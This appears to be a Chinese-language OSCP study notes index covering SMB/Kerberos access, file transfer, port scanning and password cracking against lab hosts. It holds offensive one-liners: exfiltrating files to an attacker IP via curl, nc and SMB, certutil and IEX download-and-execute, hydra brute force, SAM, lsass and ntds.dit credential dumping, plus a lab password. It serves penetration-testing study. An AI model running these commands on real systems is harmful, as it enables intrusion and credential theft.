off\n\n\n使用Kerberos协议登录smb:\n在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py：\npython ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168\n\n完全限定域名获取方式：\nhttps://github.com/CroweCybersecurity/ad-ldap-enum.git\npython3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson \n\n或者使用get-tgt获取票据，然后修改环境变量：\nsudo ntpdate -s 10.10.10.24\n\npython3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:\u0026#39;AbsoluteLDAP2022!\u0026#39; -dc-ip 10.10.11.181\n\nexport KRB5CCNAME=svc_smb.ccache\n\n\n\n爆破：\nhydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"enum4linux\"\u003eenum4linux\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eenum4linux -a -o www.harvard.edu\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e确定目录可写入：\n先挂载在本地：\u003c/p\u003e","title":"常见服务"},{"content":"1、kali web服务搭建\n服务搭建： python2:python2 -m SimpleHTTPServer python3:python3 -m http.server php:php -S 0:80 2、kali 开启python接收http服务，靶机上传\nimport sys import signal from threading import Thread from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler class PUTHandler(BaseHTTPRequestHandler): def do_PUT(self): length = int(self.headers[\u0026#39;Content-Length\u0026#39;]) content = self.rfile.read(length) self.send_response(200) with open(self.path[1:], \u0026#34;w\u0026#34;) as f: f.write(content) def run_on(port): print(\u0026#34;Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...\u0026#34;.format(sys.argv[1], port)) server_address = (sys.argv[1], port) httpd = HTTPServer(server_address, PUTHandler) httpd.serve_forever() if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) \u0026lt; 3: print(\u0026#34;Usage:\\n\\tpython {0} ip 1337\u0026#34;.format(sys.argv[0])) sys.exit(1) ports = [int(arg) for arg in sys.argv[2:]] try: for port_number in ports: server = Thread(target=run_on, args=[port_number]) server.daemon = True # Do not make us wait for you to exit server.start() signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt except KeyboardInterrupt: print \u0026#34;\\nPython HTTP PUT Server Stoped.\u0026#34; sys.exit(1) kali开启：sudo python2 put.py ip 80 靶机上传: powershell 可能出错 curl --upload-file 20240128065938_BloodHound.zip http://10.10.16.4 wget --method=PUT --post-file=20240128065938_BloodHound.zip http://10.10.16.4/ 3、nc文件传输\npowershell 调用可能出错！！： kali: nc -lvvp 4444 \u0026gt; 20240128075745_BloodHound.zip 靶机：nc.exe 10.10.16.4 4444 \u0026lt; 20240128075745_BloodHound.zip 4、scp\nkali 开启ssh: sudo systemctl restart ssh.service 传输： scp C:\\Users\\miscsvc\\Documents\\20240128065938_BloodHound.zip kali@10.10.16.4:/home/kali/Desktop/HTB/Scrambled/20240128065938_BloodHound.zip 如果是windows机器ssh开启，目录可以试试/ 密钥方式： scp -i id_rsa username@ip:路径 路径 -P port sshpass -p 密码 scp -P 端口 源文件 目标文件 无需确认： -o StrictHostKeyChecking=no 5、impacket工具包，smbserver.py\n定位： locate smbserver python smbserver.py share . 目标机访问： \\\\ip\\share\\文件 上传： net use z: \\\\10.10.16.4\\share /user:user pass copy 20240128065938_BloodHound.zip z: 或者： copy plum.sqlite-wal \\\\10.10.16.5\\share 下载也可用上面这条 powershell: $sourceFile = \u0026#34;C:\\users\\jim\\documents\\Database.kdbx\u0026#34; $destinationPath = \u0026#34;\\192.168.45.222\\anonymous_share\\data.kdbx\u0026#34; Copy-Item -Path $sourceFile -Destination $destinationPath net use M: \\\\10.10.16.14\\mane /user:smbuser password dir M:\\ 6、windows文件下载：\ncertutil -urlcache -split -f http://192.168.45.185/nc.exe c:\\windows\\system32\\spool\\drivers\\color\\ C:\\Windows\\Temp\\b.exe 这个目录 c:\\windows\\system32\\spool\\drivers\\color\\ %temp% curl http://{lhost}:8080/{command_shell} -o c:\\Windows\\Temp\\{command_shell} 7、bitsadmin\nbitsadmin /transfer myDownLoadJob /download /priority normal \u0026#34;http://10.10.90.147:8000/winPEASx64.exe\u0026#34; \u0026#34;C:\\Windows\\System32\\spool\\drivers\\color\\winPEASx64.exe\u0026#34; bitsadmin /rawreturn /transfer getfile http://url/s.zip c:\\s1.zip bitsadmin /rawreturn /transfer getpayload http://url/c.zip c:\\c1.zip 8、powershell\niwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/","summary":"\u003cp\u003e1、kali web服务搭建\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e服务搭建： \npython2:python2 -m SimpleHTTPServer \npython3:python3 -m http.server \nphp:php -S 0:80\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e2、kali 开启python接收http服务，靶机上传\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e\nimport sys\nimport signal\nfrom threading import Thread\nfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler\n\n\n\nclass PUTHandler(BaseHTTPRequestHandler):\n    def do_PUT(self):\n        length = int(self.headers[\u0026#39;Content-Length\u0026#39;])\n        content = self.rfile.read(length)\n        self.send_response(200)\n        with open(self.path[1:], \u0026#34;w\u0026#34;) as f:\n            f.write(content)\n\n\ndef run_on(port):\n    print(\u0026#34;Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...\u0026#34;.format(sys.argv[1], port))\n    server_address = (sys.argv[1], port)\n    httpd = HTTPServer(server_address, PUTHandler)\n    httpd.serve_forever()\n\n\nif __name__ == \u0026#34;__main__\u0026#34;:\n    if len(sys.argv) \u0026lt; 3:\n        print(\u0026#34;Usage:\\n\\tpython {0} ip 1337\u0026#34;.format(sys.argv[0]))\n        sys.exit(1)\n    ports = [int(arg) for arg in sys.argv[2:]]\n    try:\n        for port_number in ports:\n            server = Thread(target=run_on, args=[port_number])\n            server.daemon = True # Do not make us wait for you to exit\n        server.start()\n        signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt\n    except KeyboardInterrupt:\n        print \u0026#34;\\nPython HTTP PUT Server Stoped.\u0026#34;\n        sys.exit(1)\n\n\nkali开启：sudo python2 put.py ip 80\n靶机上传: \npowershell 可能出错\ncurl --upload-file 20240128065938_BloodHound.zip http://10.10.16.4\nwget --method=PUT --post-file=20240128065938_BloodHound.zip http://10.10.16.4/\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e3、nc文件传输\u003c/p\u003e","title":"文件传输"},{"content":"直连网络使用nmap进行扫描，非直连网络，先用Rustscan快速探测端口开放性，然后再搭建ligolo进行针对端口扫描，速度可以调到400-1000左右，测试顺利；\n列出存活主机： nmap: Linux用脚本，Windows用arp-scan.exe nmap -sn 192.168.5.0/24 理论上-sn 会包含-PR nmap -PR 192.168.5.0/24 Linux: NET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP \u0026amp;\u0026gt; /dev/null`; then echo -e \u0026#34;$NET$IP is \\033[31mup\\033[0m\u0026#34; ; else echo -e \u0026#34;$NET$IP is \\033[32mdown\\033[0m\u0026#34;; fi ; done 端口扫描： nmap: OSCP 网络不好，直连速度调1500，隧道速度调整为1000或者800，隧道情况下的扫描不可靠 sudo nmap -sT -p- -O -sV --min-rate 7000 -Pn 192.168.152.148 -oN tcp_nmap.txt sudo nmap -sU --top-ports 20 ip -oN udp_nmap.txt 筛选为适合漏洞扫描的格式 grep open tcp_nmap.txt | awk -F \u0026#39;/\u0026#39; \u0026#39;{print $1}\u0026#39;| paste -sd \u0026#39;,\u0026#39; sudo nmap -sC --script=vuln -p端口 ip -oN vuln.txt Linux: for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2\u0026gt;\u0026amp;1; done | grep -v \u0026#34;Connection refused\u0026#34; for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done windows: NC： tcp扫描： nc -nvv -w 1 -z 192.168.50.152 3388-3390 UDP扫描： nc -nv -u -z -w 1 192.168.50.149 120-123 nmap 脚本 /usr/share/nmap/scripts grep Exploits /usr/share/nmap/scripts/*.nse AutoRecon https://github.com/Tib3rius/AutoRecon 扫描器，可自动调用 将要扫描的主机放到txt文件内： powershell 不推荐，垃圾 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1 powershell.exe -nop -exec bypass -c \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://192.168.45.245:81/Invoke-Portscan.ps1\u0026#39;);Invoke-Portscan -Hosts 172.16.247.0/24 -T 4 -ports 1-10000 -ReadableOut cxk.txt\u0026#34; 端口范围： -Ports 1-10000 网段扫描： Invoke-Portscan -Hosts 192.168.1.1/24 -T 5 -TopPorts 25 -oA localnet Invoke-Portscan -Hosts 172.16.244.0/24 -T 5 -ports 1-10000 -ReadableOut cxk.txt [0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout) 5 {$nHosts=30; $Threads = 1000; $Timeout = 750 } 4 {$nHosts=25; $Threads = 1000; $Timeout = 1200 } 3 {$nHosts=20; $Threads = 100; $Timeout = 2500 } 2 {$nHosts=15; $Threads = 32; $Timeout = 3000 } 1 {$nHosts=10; $Threads = 32; $Timeout = 5000 } 加大强度，可能误报： Invoke-Portscan -Hosts 172.16.244.0/24 -Threads 2000 -nHosts 40 -Timeout 500 -ports 1-10000 -ReadableOut cxk2.txt ping扫描，建议APRscan Invoke-Portscan -Hosts 172.16.244.0/24 -PingOnly -ReadableOut PingOnly.txt 从文件中读取IP： Invoke-Portscan -HostFile hosts.txt -Threads 2000 -SkipDiscovery -nHosts 40 -Timeout 300 -ports 1-10000 -ReadableOut portscan.txt naabu 专注web https://github.com/projectdiscovery/naabu naabu -rate 500 -c 10 -s connect -p - -host 10.X.X.X -proxy 127.0.0.1:1080 文件落地的情况下： naabu.exe -p - -host 172.16.247.0/24 -o cxk.txt 参数详解： https://zhuanlan.zhihu.com/p/678578276 极端情况下： https://mp.weixin.qq.com/s/7Wc6furXUHfBfDeO3Zf7Qw ARP-scan-windows https://github.com/QbsuranAlang/arp-scan-windows- Rustscan 不如nmap，但是可以丢到目标主机执行 https://github.com/RustScan/RustScan 使用方式： rustscan.exe -a 10.10.136.140 -r 1-65535 \u0026gt; scan.txt 可能会卡住，但是多敲回车，主要是探测端口开放性，配合nmap做服务识别 nmap脚本会失效： -- -sV -sT \u0026gt; scan.txt 限制速度： --ulimit 1000 mascan 官方 https://github.com/robertdavidgraham/masscan 第三方 https://github.com/zan8in/masscan masscan.exe -p1-10000 172.16.234.0/24 --rate=5000 -oB scan.txt PORTS 列表，目前来看是代理情况下的最优解，配合ew 域内渗透的常见端口，加快扫描速度：\n20,21,22,23,25,53,67,68,69,80,81,88,102,110,123,135,137,138,139,143,161,162,389,443,445,464,465,587,989,990,993,995,1025,1080,1194,1433,1434,1521,2049,2222,2302,2483,2484,2745,3124,3127,3306,3389,5050,5222,5223,5432,5500,5554,5631,5632,5800,5900,5901,5902,5985,5986,6379,7001,8000,8009,8161,8080,8089,8888,9080,9081,9090,9800,9898,9988,27017 ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/","summary":"\u003cp\u003e直连网络使用nmap进行扫描，非直连网络，先用Rustscan快速探测端口开放性，然后再搭建ligolo进行针对端口扫描，速度可以调到400-1000左右，测试顺利；\u003c/p\u003e\n\u003ch2 id=\"列出存活主机\"\u003e列出存活主机：\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap:\n\nLinux用脚本，Windows用arp-scan.exe\n\nnmap -sn 192.168.5.0/24  理论上-sn 会包含-PR\nnmap -PR 192.168.5.0/24\n\n\n\n\nLinux:\nNET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP \u0026amp;\u0026gt; /dev/null`; then echo -e \u0026#34;$NET$IP is \\033[31mup\\033[0m\u0026#34; ; else echo -e \u0026#34;$NET$IP is \\033[32mdown\\033[0m\u0026#34;; fi ; done\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"端口扫描\"\u003e端口扫描：\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap:\nOSCP 网络不好，直连速度调1500，隧道速度调整为1000或者800，隧道情况下的扫描不可靠\n\nsudo nmap -sT -p- -O -sV --min-rate 7000 -Pn 192.168.152.148 -oN tcp_nmap.txt\nsudo nmap -sU --top-ports 20 ip -oN udp_nmap.txt\n\n\n筛选为适合漏洞扫描的格式\ngrep open tcp_nmap.txt | awk -F \u0026#39;/\u0026#39; \u0026#39;{print $1}\u0026#39;| paste -sd \u0026#39;,\u0026#39;\n\nsudo nmap -sC --script=vuln -p端口 ip -oN vuln.txt\n\n\n\nLinux:\nfor i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2\u0026gt;\u0026amp;1; done | grep -v \u0026#34;Connection refused\u0026#34;\n\n\nfor i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done\n\n\nwindows:\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"nc\"\u003eNC：\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003etcp扫描：\n\nnc -nvv -w 1 -z 192.168.50.152 3388-3390\n\nUDP扫描：\nnc -nv -u -z -w 1 192.168.50.149 120-123\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"nmap-脚本\"\u003enmap 脚本\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/usr/share/nmap/scripts\n\ngrep Exploits /usr/share/nmap/scripts/*.nse\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"autorecon\"\u003eAutoRecon\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://github.com/Tib3rius/AutoRecon\n扫描器，可自动调用\n\n将要扫描的主机放到txt文件内：\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"powershell-不推荐垃圾\"\u003epowershell 不推荐，垃圾\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1\n\n\n\npowershell.exe -nop -exec bypass -c \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://192.168.45.245:81/Invoke-Portscan.ps1\u0026#39;);Invoke-Portscan -Hosts 172.16.247.0/24 -T 4 -ports 1-10000 -ReadableOut cxk.txt\u0026#34;\n\n\n端口范围：\n-Ports 1-10000\n\n网段扫描：\nInvoke-Portscan -Hosts 192.168.1.1/24 -T 5 -TopPorts 25 -oA localnet\n\n\nInvoke-Portscan -Hosts 172.16.244.0/24 -T 5 -ports 1-10000 -ReadableOut cxk.txt\n\n[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)\n    5 {$nHosts=30;  $Threads = 1000; $Timeout = 750  }\n    4 {$nHosts=25;  $Threads = 1000; $Timeout = 1200 }\n    3 {$nHosts=20;  $Threads = 100;  $Timeout = 2500 }\n    2 {$nHosts=15;  $Threads = 32;   $Timeout = 3000 }\n    1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }\n\n加大强度，可能误报：\nInvoke-Portscan -Hosts 172.16.244.0/24 -Threads 2000 -nHosts 40 -Timeout 500 -ports 1-10000 -ReadableOut cxk2.txt\n\nping扫描，建议APRscan\n\nInvoke-Portscan -Hosts 172.16.244.0/24 -PingOnly -ReadableOut PingOnly.txt\n\n从文件中读取IP：\n\nInvoke-Portscan -HostFile hosts.txt -Threads 2000 -SkipDiscovery -nHosts 40 -Timeout 300 -ports 1-10000 -ReadableOut portscan.txt\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"naabu-专注web\"\u003enaabu 专注web\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://github.com/projectdiscovery/naabu\n\nnaabu -rate 500 -c 10 -s connect -p - -host 10.X.X.X -proxy 127.0.0.1:1080\n\n文件落地的情况下：\nnaabu.exe -p - -host 172.16.247.0/24 -o cxk.txt\n\n参数详解：\nhttps://zhuanlan.zhihu.com/p/678578276\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"极端情况下\"\u003e极端情况下：\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://mp.weixin.qq.com/s/7Wc6furXUHfBfDeO3Zf7Qw\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"arp-scan-windows\"\u003eARP-scan-windows\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://github.com/QbsuranAlang/arp-scan-windows-\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"rustscan-不如nmap但是可以丢到目标主机执行\"\u003eRustscan 不如nmap，但是可以丢到目标主机执行\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://github.com/RustScan/RustScan\n\n\n使用方式：\n\nrustscan.exe -a 10.10.136.140 -r 1-65535 \u0026gt; scan.txt\n\n可能会卡住，但是多敲回车，主要是探测端口开放性，配合nmap做服务识别\n\nnmap脚本会失效：\n-- -sV -sT \u0026gt; scan.txt\n\n限制速度：\n--ulimit 1000\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"mascan\"\u003emascan\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e官方\nhttps://github.com/robertdavidgraham/masscan\n\n第三方\nhttps://github.com/zan8in/masscan\n\nmasscan.exe -p1-10000 172.16.234.0/24 --rate=5000 -oB scan.txt\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"ports-列表目前来看是代理情况下的最优解配合ew\"\u003ePORTS 列表，目前来看是代理情况下的最优解，配合ew\u003c/h1\u003e\n\u003cp\u003e域内渗透的常见端口，加快扫描速度：\u003c/p\u003e","title":"端口扫描"},{"content":"secret\n图片信息查看： exiftool 查看图片基本信息 命令：exiftool main.gif steghide是一个图片或者音频文件的隐写工具 命令： 查看图片信息：steghide info xxx.jpg 提取文件：steghide extract -sf xxx 如果遇到加密的，可以使用stegseek进行爆破，命令如下： stegseek xx.jpg 字典路径 -xf 保存目录 二进制文件 file命令可以查看文件类型 xxd 是一个16进制dump工具，可用于查看文件的16进制内容： 命令： xxd -r -ps xxxx strings可用于查看文件可读字符串，pacp包也可以用这个查看 命令： strings xxx binwalk查看文件是否有捆绑 命令： binwalk xxx 破解压缩包密码： 7z2john backup.7z \u0026gt; hash3 john -wordlist=/usr/share/wordlists/rockyou.txt hash3 zip2john backup.zip \u0026gt; hashes john --wordlist=/usr/share/wordlists/rockyou.txt hashes zip： sudo hashcat -m 13600 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 13600 .swp: vi/vim -r 破解hash 判断hash类型： hashid hash-identifier md5: hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 其他类型的hash查询： https://hashcat.net/wiki/doku.php?id=example_hashes 无线密码： aircrack-ng -w /usr/share/wordlists xx.cap shadow密码： john shadow --format=crypt --wordlist=/usr/share/xxx hashcat: https://blog.csdn.net/m0_43406494/article/details/116736263 修改shadow的文件，包括前面的名字，和后面的很多::的内容 hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 查看爆破成功的密码： hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show 密码生成 Crunch工具的使用方法： https://blog.csdn.net/qq_63844103/article/details/127979575 NTLM HASH获取 获取备份： reg save HKLM\\sam sam.bak reg save HKLM\\system system.bak 或者： C:\\WIndows\\System32\\config\\SAM C:\\Windows\\System32\\config\\SYSTEM 读取sam的hash: samdump2 SYSTEM SAM john破解nt hash 将上一步提取的hash保存为文件： john --wordlist=/user/xxx hash.txt --format=nt 证书提取 提取私钥 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes 提取公钥 openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem 直接申请TGT： gettgtpkinit.py https://wadcoms.github.io/wadcoms/PKINIT-gettgtpkinit/ 得提前配置kinit GPP密码解密 自动： https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 手动： gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ VNC解密 echo -n 加密密码，去掉： | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv 提取宏文件 提取文件： unzip Currency\\ Volume\\ Report.xlsm 宏文件通常为.bin结尾的哪个，使用strings读取即可 dump内存读取 pip3 install pypykatz pypykatz lsa minidump lsass.DMP ntds.dit密码获取 这个文件无法直接获取，正常情况下需要管理员权限，但是特殊情况下可以获取，比如BACKUP OPERATORS组用户： 参考： https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801 这个文件需要配合system.hive文件进行破解，获取方法： reg save HKLM\\SYSTEM C:\\system.hive 破解： python3 secretsdump.py -ntds ~/Desktop/ntds.dit -system ~/Desktop/system.hiv LOCAL 16进制转换成字符串： echo -n \u0026#39;6d2424716c5f53405f504073735730726421\u0026#39; | xxd -r -p msg格式文件读取 转换格式为eml: msgconvert *.msg 读取： xdg-open xx.eml hashcat 规则编写：\nhttps://hashcat.net/wiki/doku.php?id=rule_based_attack\n在字典后面添加1： echo \\$1 \u0026gt; demo.rule 将第一个字母大写，添加1和！然后复制 $1 c $! d 测试： hashcat -r rule.rule --stdout demo.txt 默认加强规则： hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force keepass2可读取\n编号查询：\nhashcat --help | grep -i \u0026#34;PBKDF2-HMAC-SHA1\u0026#34; 在线的 https://hashcat.net/wiki/doku.php?id=example_hashes 如果要爆破john的密码，删除第一个标识 破解NTLM：\nhashcat -m 1000 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force john生成的hash的hashcat的信息处理：\n前面删除了sitebackup3.zip/joomla/web.config.txt: 后面删除了:joomla/web.config.txt:sitebackup3.zip:sitebackup3.zip 也就是第一个冒号之前的，和第二个冒号之后的都不要\n$zip2$*0*1*0*d3da047a75793317*edb3*34e*d7408d919e51ac40345a8a26d9770cf7587d4350d97d2e18536437ba2959674f04095325cb5ece9e44f3e0dc8677267181501db5088f4592eab769db53cad6767f4da474d1452231ba445ea848fc393cec5e0033322abce883785215a0dde2de71887a2acf2b690f6603f7e8a3ee9f70e2c10048e8f2706ff413c9ea9c3e8b809fd8e29044a5a0ba07035811023bf0a0a56c6ae60c314292035edb4eb0aeac0f1869fa6b7b115573e01efa597a01605cb43522a0b50a68973780a1ad4bfd964ba31088737b0823d4ba33f0f16ad799b8579fd1b1b7326d10816aa9fe030c8e97f4fc3fd2cc30d5cfbff15638cd254d3b28dba99d89d46e0178246fae980decc41137ab1767d75b45f09a3fdd02edb175283a34a8d4439f0abbdcf411efb41ad797d9515beaafb8549d5ab0fb81172967d507b82f5db8d271222696fd703871f74cf7744194e4ffa744e4436471dece563cb2f2e5a16b1a2ae66e004d890ea0b060e551c5372f53ca6c6fd94f0af009e475137bf1a17730ffa8939bf2f7fb30c9bbdaecb00d188f3080426155e08f56e11d42c3db9b4877df51f30c0f8c4b67c245f8bf880093ada71c0a00034f98b09424e2f9181d48dabde0916081a3e9b4640eea7381365321925f9ac5ac793c0eafa5dfeff42bf0c648b8aef353ef7b24ea507282cf1190640817571e56f425ae52ca51a19eba89c1e45219bd7e71b3ea319d99886ad1682850fa3433db526de39c1bb217745fc1d38b261f6743341e8b0dbc12acf42fbf48411d31ece1555b9e6bb65ec5ff06ef75b781f537a62b19e5a607bc58809f15437c138bf17d3906a5b6fbdfc34d0f42ecba74199d3194893af9fa559b3266356ea21f50559c7e59adc8126d82954d5b748a95267e666516787e0218bdcca1b28699b4574f3e50748bac9ba19afc9c7f20c5b17bde8226441cd12107f6e0b62c8a250b80689ce500c599a482abcca70d07d8a16a0c7fcb18f9ee8bc53751cb231c1ba9353cb761c73ec876f2b685ca1a754de1e99f9064775d1232e11f7fd3a7450c44777b4bb3b3adc3adc57e90d9310a6f455001ea26c4b96f8a5dc7e5ac8d463b931b86ed1f24852c6c1fa2b0432c501c05841a393156c0672e414c12644c408d6fb0ff822de964712ee8c7636360f77e0f5eda4060848ed55f5047241b79528ce286fd4fce1a*937f3ebe53da3f7d775a*$/zip2$ john john使用规则： 需要添加规则到配置文件： 示例，创建一个文件： [List.Rules:sshRules] c $1 $3 $7 $! c $1 $3 $7 $@ c $1 $3 $7 $# 追加配置文件： sudo sh -c \u0026#39;cat /home/kali/passwordattacks/ssh.rule \u0026gt;\u0026gt; /etc/john/john.conf\u0026#39; 调用： john --wordlist=ssh.passwords --rules=sshRules ssh.hash 安卓逆向 docker pull opensecurity/mobile-security-framework-mobsf:latest docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/","summary":"\u003cp\u003esecret\u003c/p\u003e\n\u003ch2 id=\"图片信息查看\"\u003e图片信息查看：\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eexiftool 查看图片基本信息 \n命令：exiftool main.gif \n\nsteghide是一个图片或者音频文件的隐写工具 \n命令： \n查看图片信息：steghide info xxx.jpg \n提取文件：steghide extract -sf xxx \n如果遇到加密的，可以使用stegseek进行爆破，命令如下： \nstegseek xx.jpg 字典路径 -xf 保存目录\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"二进制文件\"\u003e二进制文件\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003efile命令可以查看文件类型\n\nxxd 是一个16进制dump工具，可用于查看文件的16进制内容：\n命令：\nxxd -r -ps xxxx \n\nstrings可用于查看文件可读字符串，pacp包也可以用这个查看 \n命令：\nstrings xxx \n\nbinwalk查看文件是否有捆绑 \n命令：\nbinwalk xxx\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"破解压缩包密码\"\u003e破解压缩包密码：\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e7z2john backup.7z \u0026gt; hash3 \njohn -wordlist=/usr/share/wordlists/rockyou.txt hash3\n\nzip2john backup.zip \u0026gt; hashes \njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes\n\nzip：\n\nsudo hashcat -m 13600 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n13600\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"swp\"\u003e.swp:\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evi/vim -r \n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"破解hash\"\u003e破解hash\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e判断hash类型：\nhashid \nhash-identifier\n\nmd5:\nhashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt\n\n其他类型的hash查询：\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\n\n无线密码：\naircrack-ng -w /usr/share/wordlists xx.cap\n\n\nshadow密码：\njohn shadow --format=crypt --wordlist=/usr/share/xxx\n\nhashcat:\nhttps://blog.csdn.net/m0_43406494/article/details/116736263\n\n修改shadow的文件，包括前面的名字，和后面的很多::的内容\n\nhashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\n查看爆破成功的密码：\nhashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"密码生成\"\u003e密码生成\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eCrunch工具的使用方法：\nhttps://blog.csdn.net/qq_63844103/article/details/127979575\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"ntlm-hash获取\"\u003eNTLM HASH获取\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e获取备份：\nreg save HKLM\\sam sam.bak\nreg save HKLM\\system system.bak\n\n或者：\nC:\\WIndows\\System32\\config\\SAM\nC:\\Windows\\System32\\config\\SYSTEM\n\n读取sam的hash:\nsamdump2 SYSTEM SAM\n\njohn破解nt hash\n将上一步提取的hash保存为文件：\njohn --wordlist=/user/xxx hash.txt --format=nt\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"证书提取\"\u003e证书提取\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e提取私钥\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes\n提取公钥\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out 